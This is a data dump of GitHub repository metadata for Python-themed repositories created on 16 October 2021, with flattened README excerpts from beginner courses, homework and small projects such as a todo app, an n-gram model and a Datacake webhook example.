417797381;Python-Course;https://github.com/RukunMi/Python-Course;;2021-10-16T10:45:18Z;0;0;0;Python-Course It's a Python course to review and knowledge enrichment 
417806483;Python_Learnning;https://github.com/Jimmy142857/Python_Learnning;Python;2021-10-16T11:24:23Z;0;0;0;Python_Learnning Mainly from Python Crash Course, 2nd Edition 
417844163;Python-Projects;https://github.com/Eximius2286/Python-Projects;;2021-10-16T14:00:31Z;1;1;0;
417865462;Practice_Python;https://github.com/0ashu0/Practice_Python;;2021-10-16T15:16:10Z;0;0;0;Practice_Python 
417765324;Python_priject;https://github.com/AnlaAnla/Python_priject;Python;2021-10-16T08:23:30Z;0;0;0;
417856024;projet-python;https://github.com/Taciano06/projet-python;Python;2021-10-16T14:41:43Z;0;0;0;
417848406;python_digital;https://github.com/guytapi/python_digital;;2021-10-16T14:15:30Z;0;0;0;
417839109;python-challenge;https://github.com/Yuta07/python-challenge;Python;2021-10-16T13:39:17Z;0;0;0;
417839763;deeplearning_python;https://github.com/XingYi-Liu/deeplearning_python;Python;2021-10-16T13:42:09Z;0;0;0;deeplearning_python 《深度学习入门》配套练习 
417866456;Python-2;https://github.com/sid6602/Python-2;Python;2021-10-16T15:19:53Z;0;0;0;
417823426;OPENCV-PYTHON;https://github.com/bimoputrad/OPENCV-PYTHON;;2021-10-16T12:36:18Z;0;0;0;
417781074;DonutPython;https://github.com/HakuOfficial/DonutPython;Python;2021-10-16T09:34:46Z;0;0;0;"remember to do pip install pygame ;) and to run the file write py donut.py or python3 donut.py or python donut.py "
417848622;learn-python;https://github.com/luoxuesen/learn-python;;2021-10-16T14:16:10Z;0;0;0;
417813075;python_plc;https://github.com/gx0404/python_plc;Python;2021-10-16T11:52:41Z;0;0;0;python_plc snap7 
417785722;git_python;https://github.com/protexsmirnov/git_python;Python;2021-10-16T09:54:11Z;0;0;0;
417837893;play_python;https://github.com/xiaobaile/play_python;Python;2021-10-16T13:34:21Z;0;0;0;play_python 1. Content   configuration: 保存模型的配置文件。   data_directory: 保存模型的训练文件，验证文件和测试文件。   data_processor: 对数据进行预处理操作。   log_directory: 模型输出的日志目录。   model: 模型。   checkpoint: 模型的训练完的保存目录。   pretrained_bert_models: bert预训练模型路径。   result_directory: 任务测试结果路径。   run: 执行模型路径。   task: natural language processing common tasks。   utils: 常用的工具函数。   2. Commit   feat：新功能（feature）。   fix：修复bug，产生diff并自动修复此问题。适合于一次提交直接修复问题。   to：修复bug，只产生diff不自动修复此问题。适合于多次提交。最终修复问题提交时使用fix。   docs：文档（documentation）。   style：格式（不影响代码运行的变动）。   refactor：重构（即不是新增功能，也不是修改bug的代码变动）。   perf：优化相关，比如提升性能、体验。   test：增加测试。   chore：构建过程或辅助工具的变动。   revert：回滚到上一个版本。   merge：代码合并。   sync：同步主线或分支的Bug。   
417790798;Python_project;https://github.com/ganu07/Python_project;;2021-10-16T10:14:05Z;0;0;0;Python_project Final project 
417796141;task-python;https://github.com/raghavendra752001/task-python;Python;2021-10-16T10:39:07Z;0;0;0;task-python 
417801118;Python-homework;https://github.com/PanoZed/Python-homework;;2021-10-16T11:01:14Z;0;0;0;Python-homework 
417827022;learn_python;https://github.com/satyarishi/learn_python;Python;2021-10-16T12:50:45Z;0;0;0;learn_python 
417787991;learning_python;https://github.com/v1er/learning_python;HTML;2021-10-16T10:02:50Z;0;0;0;
417808040;python-programs;https://github.com/gyanendrapc/python-programs;;2021-10-16T11:30:56Z;0;0;0;
417796782;IntrodudicaoaoPython;https://github.com/joseboas/IntrodudicaoaoPython;;2021-10-16T10:42:37Z;0;0;0;Introdução ao Python Arquivos com Fontes em Python 3 Conteúdo • Laço de Repetição  • Listas  • Manipulação de Listas  • Tuplas  • Dicionários • Conjuntos • Funções  
417800865;Python-Sets-;https://github.com/Bonimum/Python-Sets-;;2021-10-16T11:00:24Z;0;0;0;[Python Sets] {https://www.datacamp.com/community/tutorials/sets-in-python} Proposed title of article Sets in Python Introduction paragraph (2-3 paragraphs): Sets are a mutable collection of distinct (unique) immutable values that are unordered. Sets are another standard Python data type that also store values. In this tutorial we will learn about Python sets: what they are, how to create them, when to use them, built-in functions, and their relationship to set theory operations. Key takeaways: This tutorial will introduce you a few topics about Python sets and set theory: How to initialize empty sets and sets with values. How to add and remove values from sets How to use efficiently use sets for tasks such as membership tests and removing duplicate values from a list. How to perform common set operations like unions, intersections, difference, and symmetric difference. The difference between a set and a frozenset References: N/A 
417875146;react-python;https://github.com/kerker20/react-python;JavaScript;2021-10-16T15:53:29Z;0;0;0;
417862151;Python-Scripts;https://github.com/bilal-23/Python-Scripts;;2021-10-16T15:04:12Z;0;0;0;
417821653;python-bootcamp;https://github.com/Navinchinnasamy/python-bootcamp;;2021-10-16T12:29:12Z;0;0;0;python-bootcamp Udemy - Python Bootcamp Excercises 
417842587;BOJ_Python;https://github.com/gkswns3708/BOJ_Python;;2021-10-16T13:54:10Z;0;0;0;BOJ_Python BOJ_Python 
417834312;python-CEV;https://github.com/geandson14/python-CEV;Python;2021-10-16T13:19:30Z;1;1;0;python Curso de Python CEV 
417764988;Python_files;https://github.com/uchithopper/Python_files;Python;2021-10-16T08:21:45Z;0;0;1;Python_files This repo contains python related files.  And Small projects type code. 
417872773;Python_Classes;https://github.com/anandrex5/Python_Classes;Jupyter Notebook;2021-10-16T15:44:15Z;0;0;0;Python_Classes 
417874206;Coursera_Python;https://github.com/Yue2u/Coursera_Python;Python;2021-10-16T15:49:47Z;0;0;0;"Solves for tasks from course ""Specializtion Python programming"" from Coursera: https://www.coursera.org/specializations/programming-in-python "
417797057;FLY-python;https://github.com/fly-int/FLY-python;;2021-10-16T10:43:51Z;0;0;0;
417793557;python_lutz;https://github.com/nudimannui4e/python_lutz;Python;2021-10-16T10:26:58Z;0;0;0;python_lutz 
417851820;python-deque;https://github.com/Dennis-Oberg/python-deque;Python;2021-10-16T14:26:31Z;0;0;0;python-deque #fun random implementation of a deque with head and tail 
417802104;python-programming;https://github.com/PraneetMane2208/python-programming;Python;2021-10-16T11:05:00Z;0;0;0;python-programming 
417842660;hypermodern-python;https://github.com/frayer/hypermodern-python;Python;2021-10-16T13:54:25Z;0;0;0;hypermodern-python Following a tutorial at https://medium.com/@cjolowicz/hypermodern-python-d44485d9d769 
417873662;SomaPython;https://github.com/Gabr1e/SomaPython;Python;2021-10-16T15:47:41Z;0;0;0;
417824417;OPENCV_PYTHON;https://github.com/bimoputrad/OPENCV_PYTHON;;2021-10-16T12:40:19Z;0;0;0;
417789321;Python-Project;https://github.com/joemaskery/Python-Project;;2021-10-16T10:07:48Z;0;0;0;Python-Project Python Project to test skills 
417859873;Python_Project;https://github.com/Danesnote/Python_Project;;2021-10-16T14:55:58Z;0;0;0;
417860791;HelloPython;https://github.com/marutata/HelloPython;;2021-10-16T14:59:30Z;0;0;0;
417870766;python_practice;https://github.com/kfcole20/python_practice;Python;2021-10-16T15:36:20Z;0;0;0;python_practice This is a refresher to keep my skills fine tuned. Most of these files will be data structures and functions that I am familair with and new ones that will be incorporated. 
417840435;SQLALCHEMY_PYTHON;https://github.com/mohamednader973/SQLALCHEMY_PYTHON;Jupyter Notebook;2021-10-16T13:44:57Z;0;0;0;SQLALCHEMY_PYTHON working with real word databases 
417800129;Python-HW;https://github.com/TatjanaAndreichuka/Python-HW;Python;2021-10-16T10:57:33Z;0;0;0;Python-HW Assignments 
417787349;test_python;https://github.com/saiddais/test_python;Python;2021-10-16T10:00:46Z;0;0;0;
417831030;Python_Assignments;https://github.com/Annaswami/Python_Assignments;;2021-10-16T13:06:48Z;0;0;0;
417820374;Algorithms-Python-;https://github.com/ililiiilil/Algorithms-Python-;Python;2021-10-16T12:23:44Z;0;0;0;python 공부를 위한 repository 
417773758;Python-Practice;https://github.com/Circusray/Python-Practice;Python;2021-10-16T09:02:47Z;0;0;0;
417781778;Bio_Python;https://github.com/Gummyyy/Bio_Python;Jupyter Notebook;2021-10-16T09:37:35Z;0;0;0;
417839258;python_5;https://github.com/alex22866/python_5;;2021-10-16T13:39:54Z;0;0;0;
417796228;python--study;https://github.com/Liangyueeee/python--study;;2021-10-16T10:39:32Z;0;0;0;
417798329;Python_Practise;https://github.com/affsatheesh/Python_Practise;;2021-10-16T10:49:49Z;0;0;0;
417837848;advanced-python;https://github.com/sirvan3tr/advanced-python;;2021-10-16T13:34:12Z;0;0;0;Advanced Python Advanced Python tips and tricks. This includes methods in optimising and improving the speed of your Python code. Faster Python Profiling line_profiler line_profiler is a module for doing line-by-line profiling of functions. kernprof is a convenient script for running either line_profiler or the Python standard library's cProfile or profile modules, depending on what is available. line_profiler is an external package that can be installed by pip install line_profiler.  In order to a profile a specific function, you add a decorator, @profile, to the desired function. Run kernprof -l YOURCODE.PY, this will create a *.lprof file for you which can be viewed by running python3 -m line_profiler YOURCODE.PY.lprof  Resources  https://uwpce-pythoncert.github.io/SystemDevelopment/profiling.html  
417786951;python_cource;https://github.com/amuriks7/python_cource;Python;2021-10-16T09:59:05Z;0;0;0;
417872779;Python-Object-;https://github.com/BatOrgil0905/Python-Object-;Python;2021-10-16T15:44:17Z;0;0;0;
417871048;Python-2021;https://github.com/daveekh/Python-2021;Python;2021-10-16T15:37:27Z;0;0;0;Python 2021 Programowanie w Pythonie 2021/22 Copyright © Dawid Nadzieja 2021 
417838045;stream-deflate;https://github.com/michalc/stream-deflate;Python;2021-10-16T13:34:59Z;2;2;1;stream-inflate   Uncompress DEFLATE streams in pure Python.  Work in progress. This README serves as a rough design spec.  Installation pip install stream-inflate Usage from stream_inflate import stream_inflate import httpx  def compressed_chunks():     # Iterable that yields the bytes of a DEFLATE-compressed stream     with httpx.stream('GET', 'https://www.example.com/my.txt') as r:         yield from r.iter_raw(chunk_size=65536)  for uncompressed_chunk in stream_inflate(compressed_chunks()):     print(uncompressed_chunk) 
417831880;intro-to-python-programming;https://github.com/fosajeff/intro-to-python-programming;;2021-10-16T13:10:12Z;0;0;0;
417875022;python-caesar-cypher;https://github.com/DiogoC7/python-caesar-cypher;Python;2021-10-16T15:52:58Z;0;0;0;
417861114;hacktoberfest-2021-python;https://github.com/mujacm/hacktoberfest-2021-python;;2021-10-16T15:00:46Z;0;0;6;HackNight 2.0 - MUJ ACM Virtual Hacktoberfest Meetup  Contribution Guidelines Hey developers, we're glad to have you here! Before you start contributing to the repositories for HacktoberFest 2021, remember that it is really important to make this celebration of Open Source inclusive... Read More  NOTE: Check out the 'CONTRIBUTORS.md' file of the repository you are planning to contribute to in order to know how the maintainers would like you to contribute to the repository.  
417866382;ResearchPythonUCL;https://github.com/AbsArosi/ResearchPythonUCL;;2021-10-16T15:19:37Z;0;0;0;
417871053;IBM-Python-Data-Science;https://github.com/Davide-kk/IBM-Python-Data-Science;;2021-10-16T15:37:27Z;0;0;0;IBM-Python-Data-Science Professional Certificate for data science w/ Python 
417796560;ML-with-Python;https://github.com/m4rtinkoenig/ML-with-Python;Jupyter Notebook;2021-10-16T10:41:30Z;0;0;0;ML-with-Python [WIP] In this repository, I create simple projects from classical machine learning, e.g.:  Classification  Logistic Regression KNN Regression Decision Trees Random Forests Gradient Boosting   Clustering  Autoencoders Variational Autoencoders    Install Prerequisite: python >= 3.6  Install venv.  venv_name=venv python -m venv $venv_name  # install venv source $venv_name/bin/activate  # activate venv  Install requirements.  pip install --upgrade pip  # update pip pip install -r requirements.txt  # install required packages 
417845981;python-course_sariqdev;https://github.com/apayziev/python-course_sariqdev;Python;2021-10-16T14:06:57Z;0;0;0;python-course_sariqdev Basics of Python language 
417810479;graphql-python-api;https://github.com/romeopeter/graphql-python-api;Python;2021-10-16T11:42:10Z;0;0;0;
417854220;Music-Player-by-python;https://github.com/vaisharma16/Music-Player-by-python;Python;2021-10-16T14:34:59Z;0;0;0;
417864896;todo-list-python-s;https://github.com/alectrlsupr/todo-list-python-s;Python;2021-10-16T15:14:08Z;0;0;0;TodoList app with Python The program show a menu to perform CRUD operations over a list of todo resource 1: Create new todo 2: Show a specific todo 3: Complete a todo 4: Update a todo  5: Delete a todo   Specifications The todo list is a collection of todos A todo has name, description and done attributes The program will hace three classes: Menu: Generate the interface to the interact with the todo list TodoList: To manage the list of todos ToDo: To represent a single todo 
417855050;industrial_python_2021;https://github.com/makaryb/industrial_python_2021;Python;2021-10-16T14:38:06Z;0;0;0;industrial_python_2021 big_data_team_python_course 
417786521;python_testing_student_class;https://github.com/4n4ru/python_testing_student_class;Dockerfile;2021-10-16T09:57:34Z;0;0;0;" Welcome Ana, This is the Code Institute student template for Gitpod. We have preinstalled all of the tools you need to get started. It's perfectly ok to use this template as the basis for your project submissions. You can safely delete this README.md file, or change it for your own project. Please do read it at least once, though! It contains some important information about Gitpod and the extensions we use. Some of this information has been updated since the video content was created. The last update to this file was: September 1, 2021 Gitpod Reminders To run a frontend (HTML, CSS, Javascript only) application in Gitpod, in the terminal, type: python3 -m http.server A blue button should appear to click: Make Public, Another blue button should appear to click: Open Browser. To run a backend Python file, type python3 app.py, if your Python file is named app.py of course. A blue button should appear to click: Make Public, Another blue button should appear to click: Open Browser. In Gitpod you have superuser security privileges by default. Therefore you do not need to use the sudo (superuser do) command in the bash terminal in any of the lessons. To log into the Heroku toolbelt CLI:  Log in to your Heroku account and go to Account Settings in the menu under your avatar. Scroll down to the API Key and click Reveal Copy the key In Gitpod, from the terminal, run heroku_config Paste in your API key when asked  You can now use the heroku CLI program - try running heroku apps to confirm it works. This API key is unique and private to you so do not share it. If you accidentally make it public then you can create a new one with Regenerate API Key.  Release History We continually tweak and adjust this template to help give you the best experience. Here is the version history: September 1 2021: Remove PGHOSTADDR environment variable. July 19 2021: Remove font_fix script now that the terminal font issue is fixed. July 2 2021: Remove extensions that are not available in Open VSX. June 30 2021: Combined the P4 and P5 templates into one file, added the uptime script. See the FAQ at the end of this file. June 10 2021: Added: font_fix script and alias to fix the Terminal font issue May 10 2021: Added heroku_config script to allow Heroku API key to be stored as an environment variable. April 7 2021: Upgraded the template for VS Code instead of Theia. October 21 2020: Versions of the HTMLHint, Prettier, Bootstrap4 CDN and Auto Close extensions updated. The Python extension needs to stay the same version for now. October 08 2020: Additional large Gitpod files (core.mongo* and core.python*) are now hidden in the Explorer, and have been added to the .gitignore by default. September 22 2020: Gitpod occasionally creates large core.Microsoft files. These are now hidden in the Explorer. A .gitignore file has been created to make sure these files will not be committed, along with other common files. April 16 2020: The template now automatically installs MySQL instead of relying on the Gitpod MySQL image. The message about a Python linter not being installed has been dealt with, and the set-up files are now hidden in the Gitpod file explorer. April 13 2020: Added the Prettier code beautifier extension instead of the code formatter built-in to Gitpod. February 2020: The initialisation files now do not auto-delete. They will remain in your project. You can safely ignore them. They just make sure that your workspace is configured correctly each time you open it. It will also prevent the Gitpod configuration popup from appearing. December 2019: Added Eventyret's Bootstrap 4 extension. Type !bscdn in a HTML file to add the Bootstrap boilerplate. Check out the README.md file at the official repo for more options.  FAQ about the uptime script Why have you added this script? It will help us to calculate how many running workspaces there are at any one time, which greatly helps us with cost and capacity planning. It will help us decide on the future direction of our cloud-based IDE strategy. How will this affect me? For everyday usage of Gitpod, it doesn’t have any effect at all. The script only captures the following data:  An ID that is randomly generated each time the workspace is started. The current date and time The workspace status of “started” or “running”, which is sent every 5 minutes.  It is not possible for us or anyone else to trace the random ID back to an individual, and no personal data is being captured. It will not slow down the workspace or affect your work. So….? We want to tell you this so that we are being completely transparent about the data we collect and what we do with it. Can I opt out? Yes, you can. Since no personally identifiable information is being captured, we'd appreciate it if you let the script run; however if you are unhappy with the idea, simply run the following commands from the terminal window after creating the workspace, and this will remove the uptime script: pkill uptime.sh rm .vscode/uptime.sh  Anything more? Yes! We'd strongly encourage you to look at the source code of the uptime.sh file so that you know what it's doing. As future software developers, it will be great practice to see how these shell scripts work.  Happy coding! "
417833213;Python-CLI-Password-Generator;https://github.com/freeloot/Python-CLI-Password-Generator;Python;2021-10-16T13:15:18Z;1;1;0;Python-CLI-Password-Generator A Python CLI That Generates A Random Password Consisting Of Digits, Symbols & Letters  
417839491;MnPython1;https://github.com/MnPython1/MnPython1;;2021-10-16T13:40:54Z;0;0;0;
417827628;Python-index-calculation;https://github.com/isaccanedo/Python-index-calculation;Python;2021-10-16T12:53:11Z;0;0;0;Python-index-calculation 🚀 Este algoritmo consiste no cálculo de índices de vegetação, estes índices podem ser usados para agricultura de precisão por exemplo (ou sensoriamento remoto). Existem funções para definir os dados e calcular os índices implementados. 
417820275;hangman-in-python;https://github.com/prachi320/hangman-in-python;Python;2021-10-16T12:23:17Z;0;0;1;hangman-in-python 
417845363;lecture2-python;https://github.com/thierno-education/lecture2-python;;2021-10-16T14:04:39Z;0;0;0;
417841590;kmg-leetcode-python;https://github.com/kmgowda/kmg-leetcode-python;Python;2021-10-16T13:49:47Z;0;0;0;kmg-leetcode-python Python Programs for selected Leet Code Questions 
417859512;lab2_python;https://github.com/elinli02/lab2_python;;2021-10-16T14:54:43Z;0;0;0;
417841280;n-gram_python;https://github.com/UX404/n-gram_python;Python;2021-10-16T13:48:25Z;0;0;0;n-gram_python A python solution for n-gram method in NLP. Training Put your training data in the 'data/' directory (or anywhere you like), and you can train a trigram model through: python train.py -n 3 -f 'data/train_set.txt' Token counts will be generated in the form of json files in the 'n_gram_bank/' directory. Testing Put your testing data in the 'data/' directory (or anywhere you like), and you use the trained trigram model to test through: python test.py -n 3 -f 'data/test_set.txt' Discounting method Different discounting methods are provided. Now includes:  Good Turing Discounting: 'turing' Gumbel Discounting: 'gumbel' (Default)  Take Truing Discounting as an example: python train.py -n 3 -f 'data/train_set.txt' -m 'turing' Instant testing After the model is trained, you can instantly test your sentence through the '-inst' arg. Note that any punctuation or capital letter should not be included. python test.py -n 2 -inst 'every day he gets up at six goes jogging and eats breakfast at seven' which outputs: PPL = 17.69532  Interesting facts Through the instant feedback command, you can see how a right-ordered scentence gets a lower probability when it's scrambled: python test.py -n 2 -inst 'mother always say an apple a day keeps the doctor away' gets the result: PPL = 14.83194  python test.py -n 2 -inst 'apple always say a doctor a day keeps the mother away' gets the result: PPL = 25.77687  python test.py -n 2 -inst 'always away mother an apple day doctor a keeps the say' gets the result: PPL = 35.93410  As the sentence gets more chaos, PPL increases. 
417802936;python-technical-documentation;https://github.com/aarushpancholi/python-technical-documentation;HTML;2021-10-16T11:08:20Z;0;0;0;python-techincal-documentation This is a HTML5 and CSS webpage I made using freeCodeCamp.org's tutorials. It is a technical documentation page on the famous programming language, Python. 
417804596;Python-Coffee-Machine;https://github.com/ben-meyer/Python-Coffee-Machine;Python;2021-10-16T11:16:11Z;0;0;0;
417835800;python-script-maker;https://github.com/MihaiBlebea/python-script-maker;Python;2021-10-16T13:25:52Z;0;0;0;Python script maker for linux How to run locally?  Clone this repo with  curl https://raw.githubusercontent.com/MihaiBlebea/python-script-maker/master/installer.sh --output installer.sh --silent && chmod +x ./installer.sh && ./installer.sh  To create a new script project, just run this script with  scriptmaker <script-name> How to uninstall from local?  Option 1 - with the installer file:  ./installer.sh -u  Option 2 - download the installer and uninstall in one command:  curl https://raw.githubusercontent.com/MihaiBlebea/python-script-maker/master/installer.sh --output installer.sh --silent && chmod +x ./installer.sh && ./installer.sh -u && rm -rf ./installer.sh  Option 3 - just run this command:  unlink ${HOME}/.local/bin/scriptmaker && rm -rf ${HOME}/.local/bin/_scriptmaker 
417779456;python_lesson6;https://github.com/NAgato1231/python_lesson6;;2021-10-16T09:28:05Z;0;0;0;
417803372;Linear-Regression-with-python;https://github.com/bushranajeeb/Linear-Regression-with-python;Jupyter Notebook;2021-10-16T11:10:19Z;0;0;0;Linear-Regression-with-python Implemented linear regression to predict the prices of houses. Suppose you are selling your house and you want to know what a good market price would be. One way to do this is to first collect information on recent houses sold and make a model of housing prices. The housingprices.csv contains a training set of housing prices in Port land, Oregon. The first column is the size of the house (in square feet), and second column is the price of the house. 
417829220;discreateMathPython;https://github.com/film8844/discreateMathPython;Python;2021-10-16T12:59:56Z;0;0;0;
417846169;finger_counter_python;https://github.com/SajawalHassan/finger_counter_python;Python;2021-10-16T14:07:43Z;0;0;0;"            Best-README-Template      An awesome README template to jumpstart your projects!      Explore the docs »   View Demo     ·     Report Bug     ·     Request Feature    Table of Contents   About The Project  Built With    Getting Started  Prerequisites Installation   Usage Roadmap Contributing License Contact Acknowledgments   About The Project  There are many great README templates available on GitHub; however, I didn't find one that really suited my needs so I created this enhanced one. I want to create a README template so amazing that it'll be the last one you ever need -- I think this is it. Here's why:  Your time should be focused on creating something amazing. A project that solves a problem and helps others You shouldn't be doing the same tasks over and over like creating a README from scratch You should implement DRY principles to the rest of your life 😄  Of course, no one template will serve all projects since your needs may be different. So I'll be adding more in the near future. You may also suggest changes by forking this repo and creating a pull request or opening an issue. Thanks to all the people have contributed to expanding this template! This is an open-soured project so you can add amazing features to the project more on here Use the BLANK_README.md to get started. back to top Built With This section should list any major frameworks/libraries used to bootstrap your project. Leave any add-ons/plugins for the acknowledgements section. Here are a few examples.  Next.js React.js Vue.js Angular Svelte Laravel Bootstrap JQuery  back to top Getting Started This is an example of how you may give instructions on setting up your project locally. To get a local copy up and running follow these simple example steps. Prerequisites This is an example of how to list things you need to use the software and how to install them.  npm npm install npm@latest -g   Installation  Get a free API Key at https://example.com Clone the repo git clone https://github.com/your_username_/Project-Name.git  Install NPM packages npm install  Enter your API in config.js const API_KEY = 'ENTER YOUR API';   back to top Usage Use this space to show useful examples of how a project can be used. Additional screenshots, code examples and demos work well in this space. You may also link to more resources. For more examples, please refer to the Documentation back to top Roadmap   Add Changelog  Add back to top links [] Add Additional Templates w/ Examples [] Add ""components"" document to easily copy & paste sections of the readme [] Multi-language Support  [] Chinese [] Spanish    See the open issues for a full list of proposed features (and known issues). (back to top) Contributing Contributions are what make the open source community such an amazing place to learn, inspire, and create. Any contributions you make are greatly appreciated. If you have a suggestion that would make this better, please fork the repo and create a pull request. You can also simply open an issue with the tag ""enhancement"". Don't forget to give the project a star! Thanks again!  Fork the Project Create your Feature Branch (git checkout -b feature/AmazingFeature) Commit your Changes (git commit -m 'Add some AmazingFeature') Push to the Branch (git push origin feature/AmazingFeature) Open a Pull Request  back to top License Distributed under the MIT License. See LICENSE.txt for more information. back to top Contact Your Name - @your_twitter - email@example.com Project Link: https://github.com/your_username/repo_name back to top Acknowledgments Use this space to list resources you find helpful and would like to give credit to. I've included a few of my favorites to kick things off!  Choose an Open Source License GitHub Emoji Cheat Sheet Malven's Flexbox Cheatsheet Malven's Grid Cheatsheet Img Shields GitHub Pages Font Awesome React Icons  back to top "
417832913;python-Rock-Paper-Scissors;https://github.com/Gugo-le/python-Rock-Paper-Scissors;Python;2021-10-16T13:14:13Z;0;0;0;python-Rock-Paper-Scissors- 
417833259;python_lesson5;https://github.com/omuralieva/python_lesson5;Python;2021-10-16T13:15:27Z;0;0;0;
417775267;Python_Project1_GATCS;https://github.com/sydzrf/Python_Project1_GATCS;Jupyter Notebook;2021-10-16T09:09:11Z;0;0;0;
417780814;Python_Telegram_bot;https://github.com/EkaterinaKonst/Python_Telegram_bot;;2021-10-16T09:33:51Z;0;0;0;Python_Telegram_bot This is an unfinished bot(( 
417783207;Python-from-a-beginner;https://github.com/hyq217/Python-from-a-beginner;;2021-10-16T09:43:50Z;0;0;0;
417810022;Python-web-scrapper;https://github.com/maruf897/Python-web-scrapper;Python;2021-10-16T11:40:02Z;0;0;0;
417811242;Python-HW-6;https://github.com/Iliakra/Python-HW-6;;2021-10-16T11:45:12Z;0;0;0;
417794010;python-docker-tut;https://github.com/Meliowant/python-docker-tut;Python;2021-10-16T10:29:17Z;0;0;0;
417826803;Python-dijkstra-bankers-algorithm;https://github.com/isaccanedo/Python-dijkstra-bankers-algorithm;Python;2021-10-16T12:49:51Z;0;0;0;"Python-dijkstra-bankers-algorithm ✨ O algoritmo do banqueiro é uma alocação de recursos e algoritmo de prevenção de deadlock desenvolvido por Edsger Dijkstra que testa a segurança simulando a alocação de quantidades máximas possíveis predeterminadas de todos os recursos e, em seguida, faz uma verificação de ""estado s"" para testar possíveis condições de deadlock para todos outras atividades pendentes, antes de decidir se a alocação deve ser permitida para continuar "
417802862;Python-StopWatch-;https://github.com/riasgry/Python-StopWatch-;Python;2021-10-16T11:08:00Z;0;0;0;
417806007;python-2021-calendar;https://github.com/hagaitrg/python-2021-calendar;Python;2021-10-16T11:22:18Z;0;0;0;2021 Python Calendar Example Output               
417775025;Mirai-TBK-Python;https://github.com/syhien/Mirai-TBK-Python;Python;2021-10-16T09:08:06Z;0;0;0;
417874035;python-api-challenge;https://github.com/PigionLou/python-api-challenge;;2021-10-16T15:49:09Z;0;0;0;python-api-challenge 
417863222;Time-module-python;https://github.com/ASJADSYED08/Time-module-python;Python;2021-10-16T15:08:06Z;0;0;0;
417793173;String-validators-in-python;https://github.com/duncandegwa/String-validators-in-python;;2021-10-16T10:25:07Z;0;0;0;String-validators-in-python Often times, we work with strings and want to quickly check if they are of a particular type or contain specific data. While we can do the same by either storing the characters of the string in a data structure or explicitly writing down statements to verify, string validators in Python can simplify our task. This can be useful when validating a password string or any other user input. String validators are essentially functions that allow us to check if a string meets certain criteria. This post is an introduction to string validators and assumes no prior knowledge of them  Checking if a Given String Is Alphanumeric Checking if a Given String Is Alphabetic Checking if a Given String Is All Numbers Checking if a Given String Is Lowercase Checking if a Given String Is Uppercase Checking if a Given String Is Blank Checking if a Given String Is Title Cased  
417788369;python-cv-builder-project;https://github.com/Kamran-Riyaz/python-cv-builder-project;Python;2021-10-16T10:04:14Z;0;0;0;python cv builder project Installation run python install -r requirements.txt  
417848144;Python-Task---SOFTORA;https://github.com/PoojaC17/Python-Task---SOFTORA;Jupyter Notebook;2021-10-16T14:14:38Z;0;0;0;Python-Task---SOFTORA 
417862049;Split-PDF-files---Python-;https://github.com/hexcode-bd/Split-PDF-files---Python-;Python;2021-10-16T15:03:48Z;0;0;0;Split PDF files - Python Split a PDF file by page ranges or extract all PDF pages to multiple PDF files. Split or extract PDF files online, easily and free. 
417810605;vk-education-python-course;https://github.com/p134d/vk-education-python-course;Python;2021-10-16T11:42:42Z;0;0;0;
417784250;Little-python-tictactoe;https://github.com/energistix/Little-python-tictactoe;Python;2021-10-16T09:48:09Z;0;0;0;
417803077;Python-Swift-Twitter;https://github.com/mo393/Python-Swift-Twitter;Swift;2021-10-16T11:09:00Z;0;0;0;
417783828;python-datacake-http-example;https://github.com/datacake/python-datacake-http-example;JavaScript;2021-10-16T09:46:25Z;0;0;0;"Python 2 Datacake Introduction  It's super easy to send Data from Python to Datacake. Here's an example.  Python Script  In the following snippet you see a short Python code that is using the Python Requests Package to perfom an HTTP Post Request with encapsulated JSON Data.  import requests  if __name__ == ""__main__"":      # individual datacake webhook url     datacake_url = ""https://api.datacake.co/integrations/api/ae6dd531-4cf6-4966-b5c9-6c43939aae90/""      # Just some random demo data     number_of_persons_a = 234     number_of_persons_b = 345     additional_payload = ""bla bla""     some_data = 23.456      # create api call     r = requests.post(datacake_url, json={         ""number_of_persons_a"": number_of_persons_a,         ""number_of_persons_b"": number_of_persons_b,         ""additional_payload"": additional_payload,         ""some_data"": some_data     })      print(r) Datacake Decoder  We are sending Data to Datacake using an individual webhook url. On the device we need to provide a short decoder that decodes the incoming data using a short javascript snippet. Paste the following snippet into the Datacake Decoder Section for HTTP Payload Decoder.  function Decoder(request) {      // hardcoded serial     var serial = ""9c26490c-8cb0-4ab0-a27f-989ffc1f4339"";      // extract payload from request.body and parse as json     var payload = JSON.parse(request.body)      // extract data     var number_of_persons_a = payload.number_of_persons_a;     var number_of_persons_b = payload.number_of_persons_b;     var additional_payload = payload.additional_payload;     var some_data = payload.some_data;      // forward to datacake     return [         {             device: serial, // payload decoder runs on product so we need to tell which device we want to route the data to             field: ""NUMBER_OF_PERSONS_A"", // the field identifier from database             value: number_of_persons_a // the actual data extracted from request.body         },         {             device: serial,             field: ""NUMBER_OF_PERSONS_B"",             value: number_of_persons_b         },         {             device: serial,             field: ""ADDITIONAL_PAYLOAD"",             value: additional_payload         },         {             device: serial,             field: ""SOME_DATA"",             value: some_data         },     ]; } "
417868833;Python-Final-Exam;https://github.com/BatOrgil0905/Python-Final-Exam;Python;2021-10-16T15:28:55Z;0;0;0;
417876921;python-cheatsheet2;https://github.com/coktale/python-cheatsheet2;Jupyter Notebook;2021-10-16T16:00:50Z;0;0;0;"About  Basic cheatsheet for Python mostly based on the book written by Al Sweigart, Automate the Boring Stuff with Python under the Creative Commons license and many other sources. Contribute All contributions are welcome:  Read the issues, Fork the project and do a Pull Request. Request a new topic creating a New issue with the enhancement tag. Find any kind of errors in the cheat sheet and create a New issue with the details or fork the project and do a Pull Request. Suggest a better or more pythonic way for existing examples.  Read It  Website Github PDF Jupyter Notebook  Python Cheatsheet  About  Contribute Read It Python Cheatsheet The Zen of Python Python Basics  Math Operators Data Types String Concatenation and Replication Variables Comments The print() Function The input() Function The len() Function The str(), int(), and float() Functions   Flow Control  Comparison Operators Boolean evaluation Boolean Operators Mixing Boolean and Comparison Operators if Statements else Statements elif Statements while Loop Statements break Statements continue Statements for Loops and the range() Function For else statement Importing Modules Ending a Program Early with sys.exit()   Functions  Return Values and return Statements The None Value Keyword Arguments and print() Local and Global Scope The global Statement   Exception Handling  Basic exception handling Final code in exception handling   Lists  Getting Individual Values in a List with Indexes Negative Indexes Getting Sublists with Slices Getting a List’s Length with len() Changing Values in a List with Indexes List Concatenation and List Replication Removing Values from Lists with del Statements Using for Loops with Lists Looping Through Multiple Lists with zip() The in and not in Operators The Multiple Assignment Trick Augmented Assignment Operators Finding a Value in a List with the index() Method Adding Values to Lists with the append() and insert() Methods Removing Values from Lists with remove() Removing Values from Lists with pop() Sorting the Values in a List with the sort() Method Tuple Data Type Converting Types with the list() and tuple() Functions   Dictionaries and Structuring Data  The keys(), values(), and items() 